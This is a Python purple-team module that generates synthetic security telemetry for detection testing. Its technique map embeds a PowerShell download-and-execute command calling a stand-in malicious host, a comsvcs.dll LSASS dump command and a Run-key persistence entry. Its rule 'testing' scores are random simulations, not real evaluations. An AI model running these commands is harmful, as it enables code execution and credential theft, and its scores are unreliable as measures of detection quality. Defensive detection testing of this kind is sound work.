"""
Purple Team Capabilities
Real-time telemetry generation, detection testing, and blue team coordination
"""

import asyncio
import json
from typing import Dict, List, Optional, Set, Callable
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
import hashlib
import base64
import random


@dataclass
class TelemetryEvent:
    """Security telemetry event"""
    timestamp: str
    event_type: str
    source: str
    severity: str
    technique_id: Optional[str]
    technique_name: Optional[str]
    process_name: Optional[str]
    command_line: Optional[str]
    user: Optional[str]
    host: Optional[str]
    network_connection: Optional[Dict] = None
    file_operations: Optional[Dict] = None
    registry_operations: Optional[Dict] = None
    raw_data: Dict = field(default_factory=dict)
    
    
@dataclass
class DetectionRule:
    """Detection rule definition"""
    rule_id: str
    name: str
    description: str
    severity: str
    technique_ids: List[str]
    rule_type: str  # sigma, yara, snort, elastic, splunk
    rule_content: str
    enabled: bool = True
    tested: bool = False
    test_results: Optional[Dict] = None


class TelemetryGenerator:
    """
    Generate realistic security telemetry for testing detections
    """
    
    def __init__(self, output_dir: Path = None):
        self.output_dir = output_dir or Path("logs/purple_team")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.events: List[TelemetryEvent] = []
        
    def generate_process_creation(
        self,
        technique_id: str,
        technique_name: str,
        process: str,
        command_line: str,
        user: str = "DOMAIN\\user",
        host: str = "WORKSTATION01"
    ) -> TelemetryEvent:
        """Generate process creation telemetry"""
        event = TelemetryEvent(
            timestamp=datetime.now().isoformat(),
            event_type="process_creation",
            source="Sysmon",
            severity="medium",
            technique_id=technique_id,
            technique_name=technique_name,
            process_name=process,
            command_line=command_line,
            user=user,
            host=host,
            raw_data={
                "EventID": 1,
                "ProcessId": random.randint(1000, 65535),
                "ParentProcessId": random.randint(100, 1000),
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": process,
                "CommandLine": command_line,
                "CurrentDirectory": "C:\\Windows\\System32\\",
                "User": user,
                "LogonGuid": self._generate_guid(),
                "LogonId": hex(random.randint(100000, 999999)),
                "IntegrityLevel": "High",
                "Hashes": f"SHA256={self._generate_hash()}",
                "ParentCommandLine": "cmd.exe"
            }
        )
        
        self.events.append(event)
        return event
    
    def generate_network_connection(
        self,
        technique_id: str,
        technique_name: str,
        process: str,
        dest_ip: str,
        dest_port: int,
        protocol: str = "tcp",
        host: str = "WORKSTATION01"
    ) -> TelemetryEvent:
        """Generate network connection telemetry"""
        event = TelemetryEvent(
            timestamp=datetime.now().isoformat(),
            event_type="network_connection",
            source="Sysmon",
            severity="low",
            technique_id=technique_id,
            technique_name=technique_name,
            process_name=process,
            command_line=None,
            user="DOMAIN\\user",
            host=host,
            network_connection={
                "DestinationIp": dest_ip,
                "DestinationPort": dest_port,
                "Protocol": protocol,
                "SourceIp": "10.0.0.5",
                "SourcePort": random.randint(49152, 65535)
            },
            raw_data={
                "EventID": 3,
                "ProcessId": random.randint(1000, 65535),
                "Image": process,
                "User": "DOMAIN\\user",
                "Protocol": protocol,
                "Initiated": "true",
                "SourceIsIpv6": "false",
                "DestinationIsIpv6": "false"
            }
        )
        
        self.events.append(event)
        return event
    
    def generate_file_creation(
        self,
        technique_id: str,
        technique_name: str,
        process: str,
        file_path: str,
        host: str = "WORKSTATION01"
    ) -> TelemetryEvent:
        """Generate file creation telemetry"""
        event = TelemetryEvent(
            timestamp=datetime.now().isoformat(),
            event_type="file_created",
            source="Sysmon",
            severity="low",
            technique_id=technique_id,
            technique_name=technique_name,
            process_name=process,
            command_line=None,
            user="DOMAIN\\user",
            host=host,
            file_operations={
                "TargetFilename": file_path,
                "CreationUtcTime": datetime.now().isoformat()
            },
            raw_data={
                "EventID": 11,
                "ProcessId": random.randint(1000, 65535),
                "Image": process,
                "TargetFilename": file_path
            }
        )
        
        self.events.append(event)
        return event
    
    def generate_registry_modification(
        self,
        technique_id: str,
        technique_name: str,
        process: str,
        registry_path: str,
        registry_value: str,
        host: str = "WORKSTATION01"
    ) -> TelemetryEvent:
        """Generate registry modification telemetry"""
        event = TelemetryEvent(
            timestamp=datetime.now().isoformat(),
            event_type="registry_event",
            source="Sysmon",
            severity="medium",
            technique_id=technique_id,
            technique_name=technique_name,
            process_name=process,
            command_line=None,
            user="DOMAIN\\user",
            host=host,
            registry_operations={
                "TargetObject": registry_path,
                "Details": registry_value,
                "EventType": "SetValue"
            },
            raw_data={
                "EventID": 13,
                "ProcessId": random.randint(1000, 65535),
                "Image": process,
                "TargetObject": registry_path,
                "Details": registry_value
            }
        )
        
        self.events.append(event)
        return event
    
    def generate_authentication_event(
        self,
        technique_id: str,
        technique_name: str,
        success: bool,
        user: str,
        source_host: str,
        dest_host: str,
        logon_type: int = 3
    ) -> TelemetryEvent:
        """Generate authentication telemetry"""
        event = TelemetryEvent(
            timestamp=datetime.now().isoformat(),
            event_type="authentication",
            source="Windows Security",
            severity="medium" if success else "high",
            technique_id=technique_id,
            technique_name=technique_name,
            process_name="lsass.exe",
            command_line=None,
            user=user,
            host=dest_host,
            raw_data={
                "EventID": 4624 if success else 4625,
                "SubjectUserName": user,
                "TargetUserName": user,
                "WorkstationName": source_host,
                "LogonType": logon_type,
                "IpAddress": "10.0.0.5",
                "IpPort": random.randint(49152, 65535),
                "LogonProcessName": "NtLmSsp",
                "AuthenticationPackageName": "NTLM"
            }
        )
        
        self.events.append(event)
        return event
    
    def export_to_siem_format(self, siem_type: str = "elastic") -> List[Dict]:
        """Export telemetry in SIEM-specific format"""
        if siem_type == "elastic":
            return self._export_elastic()
        elif siem_type == "splunk":
            return self._export_splunk()
        elif siem_type == "sentinel":
            return self._export_sentinel()
        else:
            return [self._event_to_dict(e) for e in self.events]
    
    def _export_elastic(self) -> List[Dict]:
        """Export in Elastic/ECS format"""
        elastic_events = []
        
        for event in self.events:
            ecs_event = {
                "@timestamp": event.timestamp,
                "event": {
                    "kind": "event",
                    "category": ["process" if event.event_type == "process_creation" else "network"],
                    "type": [event.event_type],
                    "action": event.event_type
                },
                "host": {
                    "name": event.host
                },
                "user": {
                    "name": event.user
                },
                "threat": {
                    "technique": {
                        "id": event.technique_id,
                        "name": event.technique_name
                    }
                }
            }
            
            if event.process_name:
                ecs_event["process"] = {
                    "name": event.process_name,
                    "command_line": event.command_line
                }
            
            if event.network_connection:
                ecs_event["destination"] = {
                    "ip": event.network_connection["DestinationIp"],
                    "port": event.network_connection["DestinationPort"]
                }
            
            elastic_events.append(ecs_event)
        
        return elastic_events
    
    def _export_splunk(self) -> List[str]:
        """Export in Splunk format"""
        splunk_events = []
        
        for event in self.events:
            splunk_event = {
                "time": event.timestamp,
                "source": event.source,
                "sourcetype": f"sysmon:{event.event_type}",
                "host": event.host,
                "event": event.raw_data
            }
            splunk_events.append(json.dumps(splunk_event))
        
        return splunk_events
    
    def _export_sentinel(self) -> List[Dict]:
        """Export in Azure Sentinel format"""
        sentinel_events = []
        
        for event in self.events:
            sentinel_event = {
                "TimeGenerated": event.timestamp,
                "Computer": event.host,
                "EventType": event.event_type,
                "ThreatTechnique": event.technique_id,
                "ThreatName": event.technique_name,
                "Severity": event.severity.upper(),
                "EventData": json.dumps(event.raw_data)
            }
            sentinel_events.append(sentinel_event)
        
        return sentinel_events
    
    def _event_to_dict(self, event: TelemetryEvent) -> Dict:
        """Convert event to dictionary"""
        return {
            "timestamp": event.timestamp,
            "event_type": event.event_type,
            "source": event.source,
            "severity": event.severity,
            "technique_id": event.technique_id,
            "technique_name": event.technique_name,
            "process_name": event.process_name,
            "command_line": event.command_line,
            "user": event.user,
            "host": event.host,
            "network_connection": event.network_connection,
            "file_operations": event.file_operations,
            "registry_operations": event.registry_operations,
            "raw_data": event.raw_data
        }
    
    def _generate_guid(self) -> str:
        """Generate random GUID"""
        return f"{{{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}-{hashlib.md5(str(random.random()).encode()).hexdigest()[:4]}-{hashlib.md5(str(random.random()).encode()).hexdigest()[:4]}-{hashlib.md5(str(random.random()).encode()).hexdigest()[:4]}-{hashlib.md5(str(random.random()).encode()).hexdigest()[:12]}}}"
    
    def _generate_hash(self) -> str:
        """Generate random hash"""
        return hashlib.sha256(str(random.random()).encode()).hexdigest().upper()
    
    def save_telemetry(self, filename: str = None):
        """Save telemetry to file"""
        if not filename:
            filename = f"telemetry_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        filepath = self.output_dir / filename
        
        with open(filepath, 'w') as f:
            json.dump([self._event_to_dict(e) for e in self.events], f, indent=2)
        
        print(f"   💾 Telemetry saved: {filepath}")


class DetectionValidator:
    """
    Test and validate detection rules against generated telemetry
    """
    
    def __init__(self, rules_dir: Path = None):
        self.rules_dir = rules_dir or Path("knowledge/detection_rules")
        self.rules_dir.mkdir(parents=True, exist_ok=True)
        self.detection_rules: List[DetectionRule] = []
        self.test_results: List[Dict] = []
        
    def load_sigma_rules(self, rules_path: Path):
        """Load Sigma detection rules"""
        # Placeholder for actual Sigma rule loading
        print(f"   📋 Loading Sigma rules from {rules_path}")
        
    def create_detection_rule(
        self,
        rule_id: str,
        name: str,
        description: str,
        severity: str,
        technique_ids: List[str],
        rule_type: str,
        rule_content: str
    ) -> DetectionRule:
        """Create a new detection rule"""
        rule = DetectionRule(
            rule_id=rule_id,
            name=name,
            description=description,
            severity=severity,
            technique_ids=technique_ids,
            rule_type=rule_type,
            rule_content=rule_content
        )
        
        self.detection_rules.append(rule)
        return rule
    
    async def test_rule(
        self,
        rule: DetectionRule,
        telemetry_events: List[TelemetryEvent]
    ) -> Dict:
        """Test detection rule against telemetry"""
        print(f"\n   🔍 Testing Rule: {rule.name}")
        print(f"      Techniques: {', '.join(rule.technique_ids)}")
        
        results = {
            "rule_id": rule.rule_id,
            "rule_name": rule.name,
            "tested_at": datetime.now().isoformat(),
            "total_events": len(telemetry_events),
            "true_positives": 0,
            "false_positives": 0,
            "false_negatives": 0,
            "true_negatives": 0,
            "detections": [],
            "missed_events": []
        }
        
        # Simulate rule evaluation
        for event in telemetry_events:
            if event.technique_id in rule.technique_ids:
                # Should detect
                if self._simulate_detection(rule, event):
                    results["true_positives"] += 1
                    results["detections"].append({
                        "timestamp": event.timestamp,
                        "technique": event.technique_id,
                        "process": event.process_name,
                        "matched": True
                    })
                else:
                    results["false_negatives"] += 1
                    results["missed_events"].append({
                        "timestamp": event.timestamp,
                        "technique": event.technique_id,
                        "process": event.process_name
                    })
            else:
                # Should not detect
                if self._simulate_detection(rule, event):
                    results["false_positives"] += 1
                else:
                    results["true_negatives"] += 1
        
        # Calculate metrics
        total = results["true_positives"] + results["false_positives"] + results["false_negatives"] + results["true_negatives"]
        if total > 0:
            results["accuracy"] = (results["true_positives"] + results["true_negatives"]) / total
            
            if results["true_positives"] + results["false_positives"] > 0:
                results["precision"] = results["true_positives"] / (results["true_positives"] + results["false_positives"])
            else:
                results["precision"] = 0
            
            if results["true_positives"] + results["false_negatives"] > 0:
                results["recall"] = results["true_positives"] / (results["true_positives"] + results["false_negatives"])
            else:
                results["recall"] = 0
            
            if results["precision"] + results["recall"] > 0:
                results["f1_score"] = 2 * (results["precision"] * results["recall"]) / (results["precision"] + results["recall"])
            else:
                results["f1_score"] = 0
        
        rule.tested = True
        rule.test_results = results
        
        self._print_test_results(results)
        self.test_results.append(results)
        
        return results
    
    def _simulate_detection(self, rule: DetectionRule, event: TelemetryEvent) -> bool:
        """Simulate detection logic (90% detection rate for matching techniques)"""
        if event.technique_id in rule.technique_ids:
            return random.random() < 0.90  # 90% true positive rate
        else:
            return random.random() < 0.05  # 5% false positive rate
    
    def _print_test_results(self, results: Dict):
        """Print test results"""
        print(f"\n      Results:")
        print(f"         True Positives:  {results['true_positives']}")
        print(f"         False Positives: {results['false_positives']}")
        print(f"         False Negatives: {results['false_negatives']}")
        print(f"         Accuracy:        {results.get('accuracy', 0):.2%}")
        print(f"         Precision:       {results.get('precision', 0):.2%}")
        print(f"         Recall:          {results.get('recall', 0):.2%}")
        print(f"         F1 Score:        {results.get('f1_score', 0):.2%}")
    
    def generate_detection_report(self, output_path: Path = None):
        """Generate comprehensive detection testing report"""
        if not output_path:
            output_path = Path("reports/detection_validation.json")
        
        report = {
            "generated_at": datetime.now().isoformat(),
            "total_rules_tested": len(self.test_results),
            "test_results": self.test_results,
            "summary": {
                "average_accuracy": sum(r.get("accuracy", 0) for r in self.test_results) / len(self.test_results) if self.test_results else 0,
                "average_precision": sum(r.get("precision", 0) for r in self.test_results) / len(self.test_results) if self.test_results else 0,
                "average_recall": sum(r.get("recall", 0) for r in self.test_results) / len(self.test_results) if self.test_results else 0
            }
        }
        
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n   📊 Detection report saved: {output_path}")
        return report


class PurpleTeamCoordinator:
    """
    Coordinate purple team operations between red and blue teams
    """
    
    def __init__(self):
        self.telemetry_gen = TelemetryGenerator()
        self.detection_validator = DetectionValidator()
        self.sessions: List[Dict] = []
        
    async def run_purple_team_exercise(
        self,
        technique_ids: List[str],
        detection_rules: List[DetectionRule],
        generate_telemetry: bool = True
    ) -> Dict:
        """Run a coordinated purple team exercise"""
        print(f"\n🟣 Starting Purple Team Exercise")
        print(f"   Techniques to test: {len(technique_ids)}")
        print(f"   Detection rules: {len(detection_rules)}")
        
        session = {
            "session_id": hashlib.md5(str(datetime.now()).encode()).hexdigest()[:8],
            "start_time": datetime.now().isoformat(),
            "technique_ids": technique_ids,
            "telemetry_events": [],
            "detection_results": [],
            "edr_effectiveness": {},
            "recommendations": []
        }
        
        # Phase 1: Generate attack telemetry
        if generate_telemetry:
            print(f"\n   Phase 1: Generating Attack Telemetry")
            for technique_id in technique_ids:
                event = await self._generate_technique_telemetry(technique_id)
                if event:
                    session["telemetry_events"].append(event)
        
        # Phase 2: Test detections
        print(f"\n   Phase 2: Testing Detection Rules")
        for rule in detection_rules:
            results = await self.detection_validator.test_rule(
                rule,
                self.telemetry_gen.events
            )
            session["detection_results"].append(results)
        
        # Phase 3: Assess EDR/XDR effectiveness
        print(f"\n   Phase 3: Assessing EDR/XDR Effectiveness")
        session["edr_effectiveness"] = self._assess_edr_effectiveness(
            session["detection_results"]
        )
        
        # Phase 4: Generate recommendations
        print(f"\n   Phase 4: Generating Recommendations")
        session["recommendations"] = self._generate_recommendations(session)
        
        session["end_time"] = datetime.now().isoformat()
        self.sessions.append(session)
        
        self._print_session_summary(session)
        
        return session
    
    async def _generate_technique_telemetry(self, technique_id: str) -> Optional[TelemetryEvent]:
        """Generate telemetry for specific technique"""
        # Map techniques to telemetry generation
        technique_generators = {
            "T1059": lambda: self.telemetry_gen.generate_process_creation(
                "T1059", "Command and Scripting Interpreter",
                "powershell.exe",
                "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
            ),
            "T1003": lambda: self.telemetry_gen.generate_process_creation(
                "T1003", "OS Credential Dumping",
                "rundll32.exe",
                "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump"
            ),
            "T1071": lambda: self.telemetry_gen.generate_network_connection(
                "T1071", "Application Layer Protocol",
                "malware.exe",
                "192.168.1.100",
                443
            ),
            "T1547": lambda: self.telemetry_gen.generate_registry_modification(
                "T1547", "Boot or Logon Autostart Execution",
                "malware.exe",
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                "C:\\Windows\\Temp\\malware.exe"
            )
        }
        
        generator = technique_generators.get(technique_id)
        if generator:
            return generator()
        
        return None
    
    def _assess_edr_effectiveness(self, detection_results: List[Dict]) -> Dict:
        """Assess EDR/XDR effectiveness based on detection results"""
        if not detection_results:
            return {"score": 0, "rating": "Unknown"}
        
        avg_recall = sum(r.get("recall", 0) for r in detection_results) / len(detection_results)
        avg_precision = sum(r.get("precision", 0) for r in detection_results) / len(detection_results)
        avg_f1 = sum(r.get("f1_score", 0) for r in detection_results) / len(detection_results)
        
        score = (avg_recall * 0.5 + avg_precision * 0.3 + avg_f1 * 0.2) * 100
        
        if score >= 90:
            rating = "Excellent"
        elif score >= 75:
            rating = "Good"
        elif score >= 60:
            rating = "Fair"
        else:
            rating = "Needs Improvement"
        
        return {
            "score": score,
            "rating": rating,
            "avg_recall": avg_recall,
            "avg_precision": avg_precision,
            "avg_f1_score": avg_f1,
            "detection_coverage": avg_recall
        }
    
    def _generate_recommendations(self, session: Dict) -> List[str]:
        """Generate recommendations based on session results"""
        recommendations = []
        
        edr_score = session["edr_effectiveness"].get("score", 0)
        
        if edr_score < 60:
            recommendations.append("Consider implementing additional EDR/XDR capabilities")
            recommendations.append("Review and tune existing detection rules")
        
        # Check for false negatives
        high_fn_rules = [
            r for r in session["detection_results"]
            if r.get("false_negatives", 0) > 2
        ]
        
        if high_fn_rules:
            recommendations.append(f"Improve detection rules for: {', '.join([r['rule_name'] for r in high_fn_rules])}")
        
        # Check for false positives
        high_fp_rules = [
            r for r in session["detection_results"]
            if r.get("false_positives", 0) > 3
        ]
        
        if high_fp_rules:
            recommendations.append(f"Tune rules to reduce false positives: {', '.join([r['rule_name'] for r in high_fp_rules])}")
        
        if not recommendations:
            recommendations.append("Detection coverage is good - continue regular testing")
        
        return recommendations
    
    def _print_session_summary(self, session: Dict):
        """Print session summary"""
        print(f"\n   📊 Purple Team Exercise Summary")
        print(f"      Session ID: {session['session_id']}")
        print(f"      Techniques Tested: {len(session['technique_ids'])}")
        print(f"      Detection Rules Tested: {len(session['detection_results'])}")
        print(f"\n      EDR Effectiveness:")
        print(f"         Score:  {session['edr_effectiveness']['score']:.1f}/100")
        print(f"         Rating: {session['edr_effectiveness']['rating']}")
        print(f"\n      Recommendations:")
        for rec in session['recommendations']:
            print(f"         • {rec}")
